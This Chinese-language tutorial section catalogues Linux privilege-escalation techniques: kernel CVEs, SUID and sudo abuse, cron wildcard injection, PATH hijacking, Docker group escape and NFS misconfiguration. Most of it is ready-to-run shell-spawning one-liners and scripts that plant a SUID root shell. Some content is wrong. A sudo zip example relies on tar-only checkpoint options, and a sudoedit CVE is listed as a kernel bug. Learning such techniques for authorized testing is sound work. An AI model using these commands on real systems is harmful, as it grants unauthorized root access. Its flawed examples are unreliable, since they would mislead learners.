# Linux 提权方法

### 3.1 内核漏洞提权

**原理**

内核漏洞是指 Linux 内核中的安全漏洞，利用这些漏洞可以从普通用户提升到 root 权限。内核漏洞通常是最严重的本地提权漏洞。

**著名内核提权漏洞**

| 漏洞编号 | CVE | 影响内核版本 | 类型 | 描述 |
|----------|-----|-------------|------|------|
| Dirty COW | CVE-2016-5195 | 2.6.22 - 4.8.3 | 竞态条件 | 写时复制（COW）机制中的竞态条件 |
| Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16.11 | 管道漏洞 | 管道缓冲区覆盖任意文件内容 |
| PwnKit | CVE-2021-4034 | 所有版本（Polkit） | pkexec | pkexec 中的环境变量注入 |
| Dirty Cred | CVE-2022-2588 | 5.1 - 5.19 | UAF | 内核凭证结构体释放后使用 |
| SUID Auxv | CVE-2023-22809 | 5.15+ | sudo | sudoedit 越权写入 |
| Netfilter | CVE-2023-32233 | 5.1 - 6.3.1 | UAF | Netfilter nf_tables UAF |

**Dirty COW 原理**

```
Dirty COW（Dirty Copy-On-Write）是一个内核竞态条件漏洞：

1. Linux 使用写时复制（COW）机制管理私有内存映射
2. 当进程尝试写入私有映射的只读页面时，内核会复制页面并标记为可写
3. 漏洞存在于这个复制过程中的竞态条件
4. 攻击者可以利用竞态条件，在复制完成前修改原始只读页面
5. 从而修改映射的只读文件（如 /etc/passwd），实现提权

利用效果：普通用户可以修改任何只读文件，包括 setuid 程序和系统文件
```

**Dirty Pipe 原理**

```
Dirty Pipe 漏洞允许向任意只读文件写入数据：

1. Linux 管道使用环形缓冲区，每个缓冲区由一个 page 组成
2. 漏洞存在于管道缓冲区的合并操作中
3. 攻击者可以创建管道，写入数据后部分读取
4. 然后使用 splice() 将目标文件的页面拼接到管道缓冲区
5. 再次写入管道时，数据会写入到目标文件的页面缓存中
6. 最终修改只读文件的内容

利用效果：普通用户可以向任意只读文件写入数据（如修改 /etc/passwd 添加 root 用户）
```

**提权检测工具**

```bash
# Linux Exploit Suggester
# https://github.com/mzet-/linux-exploit-suggester
./linux-exploit-suggester.sh

# LinPEAS（全面的提权枚举脚本）
# https://github.com/carlospolop/PEASS-ng
./linpeas.sh

# Linux Smart Enumeration
# https://github.com/diego-treitos/linux-smart-enumeration
./lse.sh

# 查看内核版本
uname -a
cat /proc/version
```

### 3.2 SUID/SGID 提权

**原理**

SUID（Set User ID）是一种特殊权限，允许程序以文件所有者的权限运行。如果 SUID 程序的所有者是 root，且程序存在漏洞或可被利用，普通用户就可以通过它获得 root 权限。

**查找 SUID 文件**

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找同时有 SUID 和 SGID 的文件
find / -perm -6000 -type f 2>/dev/null

# 查找可写的 SUID 文件（高危）
find / -perm -4000 -writable -type f 2>/dev/null

# 查找特定用户拥有的 SUID 文件
find / -perm -4000 -user root -type f 2>/dev/null
```

**常见 SUID 提权场景**

**场景1：可执行系统命令（如 find、nmap、vim）**

```bash
# find 提权
find /path/to/file -exec /bin/sh \;

# nmap 提权（旧版本）
nmap --interactive
nmap> !sh

# vim 提权
vim -c ':!/bin/sh'

# less/more 提权
less /etc/passwd
!sh

# man 提权
man man
!sh

# awk 提权
awk 'BEGIN {system("/bin/sh")}'
```

**场景2：自定义 SUID 程序存在命令注入**

```bash
# 假设 /usr/local/bin/backup 是 SUID 程序，功能是备份指定目录
# 如果它直接使用 system() 或 exec 执行命令且参数可控

# 查看程序字符串
strings /usr/local/bin/backup

# 分析程序调用
strace /usr/local/bin/backup /tmp/test 2>&1 | grep exec

# 如果程序内部调用了 tar、rsync 等命令，且路径参数可注入
backup "/tmp; id"  # 可能执行 id 命令（命令注入）
```

**场景3：SUID 程序路径可写（替换文件）**

```bash
# 如果 SUID 程序本身或其所在目录可写
# 直接替换为恶意程序即可获得 root 权限

cp /bin/bash /tmp/bash
chmod u+s /tmp/bash  # 需要写权限才能设置 SUID
# 如果原 SUID 程序可写，直接覆盖即可
```

**场景4：共享库劫持**

```bash
# 如果 SUID 程序使用了相对路径的共享库，
# 或者可以通过环境变量注入恶意共享库

# 查看程序依赖的库
ldd /usr/local/bin/suid_program

# 检查 RPATH/RUNPATH
readelf -d /usr/local/bin/suid_program | grep -i rpath

# 如果 RPATH 指向可写目录，可放入恶意库
# 或使用 LD_PRELOAD（SUID 程序默认忽略 LD_PRELOAD）
```

### 3.3 sudo 提权

**原理**

sudo 允许普通用户以其他用户（通常是 root）的身份执行命令。如果 sudo 配置不当，可能被利用来提升权限。

**sudo 配置文件**

```bash
# sudo 配置文件
/etc/sudoers
/etc/sudoers.d/

# 查看当前用户的 sudo 权限
sudo -l
```

**常见 sudo 提权场景**

**场景1：允许运行特定命令，命令可被利用**

```bash
# 示例 sudoers 配置：
# user ALL=(ALL) NOPASSWD: /usr/bin/find

# find 可以执行命令
sudo find / -name test -exec /bin/bash \;

# 其他常见可利用命令：
# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# vim
sudo vim -c ':!/bin/bash'

# less/more
sudo less /etc/passwd
# 然后输入 !bash

# python
sudo python -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# tar
sudo tar cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**场景2：通配符误用**

```bash
# 示例 sudoers 配置（危险！）：
# user ALL=(ALL) NOPASSWD: /usr/bin/zip backup.zip *

# 利用通配符注入
cd /tmp
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/bash; chmod u+s /tmp/bash" > shell.sh
chmod +x shell.sh
sudo zip backup.zip *  # 执行后获得 SUID bash
/tmp/bash -p
```

**场景3：sudo 版本漏洞（CVE-2021-3156 - Baron Samedit）**

```
Baron Samedit 是 sudo 的堆溢出漏洞：

1. sudoedit 命令在处理命令行参数时存在堆溢出
2. 漏洞存在于 sudoers.c 的 set_cmnd() 函数中
3. 当命令行中包含反斜杠转义的字符时，可能触发溢出
4. 无需知道用户密码，无需 sudo 权限

影响版本：
- sudo 1.8.2 - 1.8.31p2
- sudo 1.9.0 - 1.9.5p1

检测：
sudo --version

利用工具：
https://github.com/blasty/CVE-2021-3156
```

### 3.4 计划任务提权

**原理**

计划任务（Cron Job）是 Linux 系统中定时执行任务的机制。如果计划任务配置不当，可能被利用来提升权限。

**Cron 配置文件**

```
系统级计划任务：
- /etc/crontab
- /etc/cron.d/
- /etc/cron.hourly/
- /etc/cron.daily/
- /etc/cron.weekly/
- /etc/cron.monthly/

用户级计划任务：
- /var/spool/cron/crontabs/<username> (Debian/Ubuntu)
- /var/spool/cron/<username> (CentOS/RHEL)
```

**常见计划任务提权场景**

**场景1：任务脚本可写**

```bash
# 查找 root 计划任务执行的脚本
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/

# 如果脚本可被普通用户写入
-rwxrwxrwx 1 root root 100 Sep 11 10:00 /etc/cron.daily/backup.sh

# 直接修改脚本添加提权命令
echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> /etc/cron.daily/backup.sh
# 等待任务执行，然后运行 /tmp/bash -p
```

**场景2：通配符 + 可写目录**

```bash
# 假设 cron 任务执行：
# */5 * * * * root cd /backup && tar -zcf /tmp/backup.tar.gz *

# 如果 /backup 目录可写
cd /backup
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh /tmp/shell.sh"
echo "chmod u+s /bin/bash" > /tmp/shell.sh
chmod +x /tmp/shell.sh
# 等待 cron 执行 tar 命令，触发 checkpoint action
```

**场景3：PATH 环境变量劫持**

```bash
# 假设 crontab 中设置了不安全的 PATH：
# PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 或者脚本中使用了相对路径的命令
# 脚本内容：
#!/bin/bash
cd /data
backup  # 使用了相对路径的命令

# 如果 PATH 中包含可写目录
# 在可写目录中创建同名恶意程序
cat > /tmp/backup << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/backup
# 等待 cron 执行
```

### 3.5 其他提权方法

**环境变量劫持**

```bash
# 如果 SUID 或 sudo 程序调用了相对路径的命令
# 可以通过修改 PATH 环境变量劫持

# 示例：suid_program 内部调用了 "date" 命令
export PATH=/tmp:$PATH
cat > /tmp/date << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/date
./suid_program
/tmp/bash -p
```

**可写的服务配置文件**

```bash
# 查找可写的 systemd 服务文件
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /lib/systemd/system/ -writable -type f 2>/dev/null

# 如果服务配置可写，修改 ExecStart 指向恶意程序
# 然后等待服务重启或系统重启

# 查找可写的 init.d 脚本
find /etc/init.d/ -writable -type f 2>/dev/null
```

**Docker 组提权**

```bash
# 如果用户在 docker 组中，可以利用 docker 获得 root 权限
docker run -v /:/host -it alpine chroot /host /bin/bash

# 检查用户是否在 docker 组
id
groups

# 利用：挂载宿主机根目录到容器，然后 chroot
```

**NFS 共享提权**

```bash
# 如果 NFS 共享配置了 no_root_squash
# 客户端的 root 用户在 NFS 共享上拥有 root 权限

# 查看 NFS 共享配置
cat /etc/exports

# 示例（危险配置）：
# /data *(rw,no_root_squash)

# 攻击者可以在客户端创建 SUID 文件
# 然后在目标系统上执行
```

---

---

## 📋 内容审核与补充建议

> 针对「Linux 提权方法」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
